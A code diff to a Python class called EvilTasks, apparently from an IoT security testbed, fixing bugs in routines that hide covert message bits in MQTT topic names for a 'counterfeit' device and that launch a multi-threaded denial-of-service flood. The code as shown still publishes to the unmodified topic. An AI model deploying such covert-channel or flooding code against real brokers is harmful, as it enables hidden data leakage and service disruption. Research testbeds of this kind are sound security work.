@@ -17,16 +17,18 @@ class EvilTasks:
 		
 		tokens_topic = current_topic.split("/")
 		last_topic = tokens_topic[-1]
-
+		method = method.lower()
+		print(f"Current topic: {current_topic}, flag_bit: {flag_bit}, method: {method}")
 		match method:
 			
 			case "first letter":
-				new_topic = hide_in_first_letter(current_topic, last_topic, flag_bit)
+				new_topic = self.hide_in_first_letter(current_topic, last_topic, flag_bit)
 				tokens_topic[-1] = new_topic
 				return "/".join(tokens_topic)
 
 			case "id":
-				new_topic = hide_in_id(current_topic, last_topic, flag_bit)
+				#new_topic = hide_in_id(current_topic, last_topic, flag_bit)
+				new_topic = self.hide_in_id(last_topic, flag_bit)
 				tokens_topic[-1] = new_topic
 				return "/".join(tokens_topic)
 
@@ -51,7 +53,8 @@ class EvilTasks:
 		return modified_last_topic
 
 	#Adds either 0 or 1 to the end of the topic
-	def hide_in_id(self, current_topic, last_topic, flag_bit):
+	#def hide_in_id(self, current_topic, last_topic, flag_bit):
+	def hide_in_id(self, last_topic, flag_bit):
 		
 		id_number = int(flag_bit) + 1
 		modified_last_topic = last_topic + str(id_number)
@@ -63,12 +66,14 @@ class EvilTasks:
 		bit_msg = ""
 
 		for char in message:
-			bit_msg.join(format(ord(char), "08b"))
+			bit_msg += format(ord(char), "08b")
 
 		try:
 			
 			for bit in bit_msg:
+				#print("Ci sono")
 				new_topic = self.embed_message(topic, bit, method=method)
+				print(f"Topic sent: {new_topic}")
 				self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
 				time.sleep(delay)
 
@@ -96,10 +101,9 @@ class EvilTasks:
 			embedding_method = str(config.get("EmbeddingMethod", "first letter")).strip().lower()
 		
 		except Exception as e:
-			print("Error while collecting data from configuration")
+			print(f"Error while collecting data from configuration {e}")
 
 		if device_type == "counterfeit" and covert_message:
-			
 			self.covert_publish(publisher, topic, covert_message, payload, qos, embedding_method, period)
 		else:
 
@@ -109,6 +113,9 @@ class EvilTasks:
 	#Publication method
 	def event_publish(self, publisher, config):
 		
+		if publisher is None:
+			return
+
 		if publisher._client_id:
 			
 			publisher_id = publisher._client_id.decode()
@@ -182,7 +189,7 @@ class EvilTasks:
 		end_time = time.time() + duration
 		topic = config["Topic"]
 		publish_interval = float(config["Period"])
-
+		print("STO INIZIANDO DOS")
 		for i in range(num_clients):
 			thread = threading.Thread(target=self.DoS_task, args=(f"dos_client_{i}", config, end_time))
 			thread.daemon = True
